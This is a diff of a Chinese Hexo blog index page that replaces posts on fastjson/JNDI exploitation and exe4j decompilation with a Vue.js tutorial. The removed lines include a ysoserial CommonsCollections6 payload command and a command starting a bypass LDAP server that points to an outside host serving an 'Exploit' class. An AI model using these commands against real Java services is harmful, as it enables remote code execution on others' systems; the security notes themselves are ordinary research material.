-<li>该环境的jdk版本也是过高导致有限制，因此会导致无法触发reference的http请求从而命令执行问题，饶过参考上面，或者换个jdk版本</li>
-</ol>
-<p>关于服务搭建，建议不要搭建rmi服务，因为目前看来和ldap等价，而ldap服务具有饶过的可能，因此直接使用ldap就好了。如果使用饶过则需要修改ladp服务器的部分代码，依旧是参考上面饶过的那篇文章最后提到的那段。<a href="https://github.com/kxcode/JNDI-Exploit-Bypass-Demo/tree/master/PoC" target="_blank" rel="noopener">bypass的github</a><br>关于代码修改后的编译问题：</p>
-<ol>
-<li>mvn compile   会生产class文件，会产生不带依赖的jar包</li>
-<li>mvn install  不仅会生产class还会生产jar和带依赖的jar</li>
-<li>如果部分版本冲突可以尝试修改pom文件里的版本信息</li>
-<li>java -cp Jar 包地址 person.server.LdapServer 就可以启动ldap服务，这个是通过编译的来的jar包里的class启动的server，通过marshalsec的话也是启动的marshalsec包里的ldap服务</li>
-</ol>
-<h2 id="0x06-扩展"><a href="#0x06-扩展" class="headerlink" title="0x06 扩展"></a>0x06 扩展</h2><p>由于饶过姿势太多，后续可能考虑编写一个统一的检测工具，依赖于修改ldap服务器使其针对不同的请求返回不同的利用链payload，依照这个思路来做检测。</p>
-<h2 id="0x07-关于java反序列化"><a href="#0x07-关于java反序列化" class="headerlink" title="0x07 关于java反序列化"></a>0x07 关于java反序列化</h2><p>几个工具可以看一下</p>
-<ol>
-<li><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener"> marshalsec </a></li>
-<li><a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener"> ysoserial </a><br>Java反序列化备忘录文章<a href="https://xz.aliyun.com/t/2042" target="_blank" rel="noopener">备忘录</a><br><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">javaruntime.exec payload生成</a><br>KM29Nw2ydMpJ8kRz</li>
-</ol>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 ‘命令' |base64 | sed ':t;N;s/\n//;b t'&gt; tmp1</span><br></pre></td></tr></table></figure>
-<p>//生成基于commonscollections6的payload<br>启动通过返回属性触发gadget的绕过方式的ldap：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp  fastjson-poc-1.0-SNAPSHOT-jar-with-dependencies.jar  person.server.ldap_bypass_jdklimit.Ldap_javaSerializedData http://papa.mikudapangcin:11111/#Exploit 389</span><br></pre></td></tr></table></figure></p>
-<p>可以通过生成多个gadget来绕过限制</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/25/exe4j生成的exe文件反编译记录/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="JOJO">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/touxiang.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="少女的泪">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/06/25/exe4j生成的exe文件反编译记录/" itemprop="url">exe4j生成的exe文件反编译记录</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-25T17:40:30+08:00">
-                2019-06-25
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/客户端逆向/" itemprop="url" rel="index">
-                    <span itemprop="name">客户端逆向</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="exe4j"><a href="#exe4j" class="headerlink" title="exe4j"></a>exe4j</h2><p>Exe4j是一款经典的讲java程序打包成一个exe程序的软件，没什么其他好说的。</p>
-<h2 id="识别是否exe4j"><a href="#识别是否exe4j" class="headerlink" title="识别是否exe4j"></a>识别是否exe4j</h2><p>我是通过程序中报错信息打印出的堆栈信息中含有exe4j包名来判断的，也可以直接通过下面提供的程序处理一下后看看生成的文件能不能用zip解压出java类来判断。</p>
-<h2 id="exe4j逆向处理程序代码"><a href="#exe4j逆向处理程序代码" class="headerlink" title="exe4j逆向处理程序代码"></a>exe4j逆向处理程序代码</h2><p>直接贴出代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import java.util.*;</span><br><span class="line">import java.io.*;</span><br><span class="line">public class gen &#123;</span><br><span class="line">    public static void main(String args[]) throws IOException &#123;</span><br><span class="line">        FileInputStream fin = new FileInputStream(args[0]);</span><br><span class="line">        FileOutputStream fout = new FileOutputStream(args[1]);</span><br><span class="line">        BufferedInputStream bin = new BufferedInputStream(fin);</span><br><span class="line">        BufferedOutputStream bout = new BufferedOutputStream(fout);</span><br><span class="line">        int in = 0;</span><br><span class="line">        do &#123;</span><br><span class="line">            in = bin.read();</span><br><span class="line">            if (in == -1)</span><br><span class="line">                break;</span><br><span class="line">            in ^= 0x88;</span><br><span class="line">            bout.write(in);</span><br><span class="line">        &#125; while (true);</span><br><span class="line">        bin.close();</span><br><span class="line">        fin.close();</span><br><span class="line">        bout.close();</span><br><span class="line">        fout.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<ol>
-<li><p>将这个程序保存为gen.java，名字不可以改，通过以下命令来编译：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac gen.java</span><br><span class="line">java gen.class 需要转换的exe文件名 转换后的输出文件名</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>使用zip解压软件直接解压输出的文件</p>
-</li>
-<li>正常解压后会出现java类文件，拖入jd-gui里就可以按照java逆向来走了</li>
-</ol>
+</ul>
+<p>上面是指令的写法，下面是字符串模版的写法<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Handlebars 模板 --&gt;</span></span><br><span class="line">&#123;&#123;#if ok&#125;&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Yes<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;&#123;/if&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<h2 id="0x05-循环"><a href="#0x05-循环" class="headerlink" title="0x05 循环"></a>0x05 循环</h2><p>基本for循环使用<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"site in sites"</span>&gt;</span></span><br><span class="line">      &#123;&#123; site.name &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  data: &#123;</span></span><br><span class="line"><span class="undefined">    sites: [</span></span><br><span class="line"><span class="undefined">      &#123; name: 'Runoob' &#125;,</span></span><br><span class="line"><span class="undefined">      &#123; name: 'Google' &#125;,</span></span><br><span class="line"><span class="undefined">      &#123; name: 'Taobao' &#125;</span></span><br><span class="line"><span class="undefined">    ]</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>模板中使用for循环<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">template</span> <span class="attr">v-for</span>=<span class="string">"site in sites"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; site.name &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span>&gt;</span>--------------<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>迭代对象取keyvalue<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"(value, key, index) in object"</span>&gt;</span></span><br><span class="line">     &#123;&#123; index &#125;&#125;. &#123;&#123; key &#125;&#125; : &#123;&#123; value &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>循环取整数<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">v-for</span>=<span class="string">"n in 10"</span>&gt;</span></span><br><span class="line">     &#123;&#123; n &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x06-计算属性"><a href="#0x06-计算属性" class="headerlink" title="0x06 计算属性"></a>0x06 计算属性</h2><p>原始属性、计算属性、方法<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>原始字符串: &#123;&#123; message &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>计算后反转字符串: &#123;&#123; reversedMessage &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>使用方法后反转字符串: &#123;&#123; reversedMessage2() &#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var vm = new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  data: &#123;</span></span><br><span class="line"><span class="undefined">    message: 'Runoob!'</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  computed: &#123;</span></span><br><span class="line"><span class="undefined">    // 计算属性的 getter</span></span><br><span class="line"><span class="undefined">    reversedMessage: function () &#123;</span></span><br><span class="line"><span class="undefined">      // `this` 指向 vm 实例</span></span><br><span class="line"><span class="undefined">      return this.message.split('').reverse().join('')</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  methods: &#123;</span></span><br><span class="line"><span class="undefined">    reversedMessage2: function () &#123;</span></span><br><span class="line"><span class="undefined">      return this.message.split('').reverse().join('')</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>可以说使用 computed 性能会更好，但是如果你不希望缓存，你可以使用 methods 属性。<br>计算属性默认提供getter但是也可以设置setter<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var vm = new Vue(&#123;</span></span><br><span class="line"><span class="undefined">  el: '#app',</span></span><br><span class="line"><span class="undefined">  data: &#123;</span></span><br><span class="line"><span class="undefined">    name: 'Google',</span></span><br><span class="line"><span class="undefined">    url: 'http://www.google.com'</span></span><br><span class="line"><span class="undefined">  &#125;,</span></span><br><span class="line"><span class="undefined">  computed: &#123;</span></span><br><span class="line"><span class="undefined">    site: &#123;</span></span><br><span class="line"><span class="undefined">      // getter</span></span><br><span class="line"><span class="undefined">      get: function () &#123;</span></span><br><span class="line"><span class="undefined">        return this.name + ' ' + this.url</span></span><br><span class="line"><span class="undefined">      &#125;,</span></span><br><span class="line"><span class="undefined">      // setter</span></span><br><span class="line"><span class="undefined">      set: function (newValue) &#123;</span></span><br><span class="line"><span class="undefined">        var names = newValue.split(' ')</span></span><br><span class="line"><span class="undefined">        this.name = names[0]</span></span><br><span class="line"><span class="undefined">        this.url = names[names.length - 1]</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined">// 调用 setter， vm.name 和 vm.url 也会被对应更新</span></span><br><span class="line"><span class="undefined">vm.site = '菜鸟教程 http://www.runoob.com';</span></span><br><span class="line"><span class="undefined">document.write('name: ' + vm.name);</span></span><br><span class="line"><span class="xml">document.write('<span class="tag">&lt;<span class="name">br</span>&gt;</span>');</span></span><br><span class="line"><span class="undefined">document.write('url: ' + vm.url);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x07-属性变更监听"><a href="#0x07-属性变更监听" class="headerlink" title="0x07 属性变更监听"></a>0x07 属性变更监听</h2><p>一个是watch，一个是vm.$watch(变量，回调)<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span> = <span class="string">"computed_props"</span>&gt;</span></span><br><span class="line">    千米 : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">v-model</span> = <span class="string">"kilometers"</span>&gt;</span></span><br><span class="line">    米 : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">v-model</span> = <span class="string">"meters"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"info"</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var vm = new Vue(&#123;</span></span><br><span class="line"><span class="undefined">    el: '#computed_props',</span></span><br><span class="line"><span class="undefined">    data: &#123;</span></span><br><span class="line"><span class="undefined">        kilometers : 0,</span></span><br><span class="line"><span class="undefined">        meters:0</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    methods: &#123;</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    computed :&#123;</span></span><br><span class="line"><span class="undefined">    &#125;,</span></span><br><span class="line"><span class="undefined">    watch : &#123;</span></span><br><span class="line"><span class="undefined">        kilometers:function(val) &#123;</span></span><br><span class="line"><span class="undefined">            this.kilometers = val;</span></span><br><span class="line"><span class="undefined">            this.meters = this.kilometers * 1000</span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined">        meters : function (val) &#123;</span></span><br><span class="line"><span class="undefined">            this.kilometers = val/ 1000;</span></span><br><span class="line"><span class="undefined">            this.meters = val;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined">    // $watch 是一个实例方法</span></span><br><span class="line"><span class="undefined">    vm.$watch('kilometers', function (newValue, oldValue) &#123;</span></span><br><span class="line"><span class="undefined">    // 这个回调将在 vm.kilometers 改变后调用</span></span><br><span class="line"><span class="undefined">    document.getElementById ("info").innerHTML = "修改前值为: " + oldValue + "，修改后值为: " + newValue;</span></span><br><span class="line"><span class="undefined">&#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="0x07-修饰符"><a href="#0x07-修饰符" class="headerlink" title="0x07 修饰符"></a>0x07 修饰符</h2><p>事件修饰符<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 阻止单击事件冒泡 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click.stop</span>=<span class="string">"doThis"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 提交事件不再重载页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">v-on:submit.prevent</span>=<span class="string">"onSubmit"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 修饰符可以串联  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click.stop.prevent</span>=<span class="string">"doThat"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 只有修饰符 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">v-on:submit.prevent</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 添加事件侦听器时使用事件捕获模式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-on:click.capture</span>=<span class="string">"doThis"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 只当事件在该元素本身（而不是子元素）触发时触发回调 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">v-on:click.self</span>=<span class="string">"doThat"</span>&gt;</span>...<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- click 事件只能点击一次，2.1.4版本新增 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">v-on:click.once</span>=<span class="string">"doThis"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>按键修饰符<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 只有在 keyCode 是 13 时调用 vm.submit() --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-on:keyup.13</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 同上 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">v-on:keyup.enter</span>=<span class="string">"submit"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 缩写语法 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> @<span class="attr">keyup.enter</span>=<span class="string">"submit"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>全部的按键别名：<br>.enter<br>.tab<br>.delete (捕获 “删除” 和 “退格” 键)<br>.esc<br>.space<br>.up<br>.down<br>.left<br>.right<br>.ctrl<br>.alt<br>.shift<br>.meta<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="comment">&lt;!-- Alt + C --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> @<span class="attr">keyup.alt.67</span>=<span class="string">"clear"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Ctrl + Click --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> @<span class="attr">click.ctrl</span>=<span class="string">"doSomething"</span>&gt;</span>Do something<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
 
           
         
@@ -1808,7 +1865,7 @@
 
   
   <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1856,7 +1913,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">18</span>
+                  <span class="site-state-item-count">25</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1867,7 +1924,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">17</span>
                   <span class="site-state-item-name">categories</span>
                 </a>
               </div>
@@ -1878,7 +1935,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
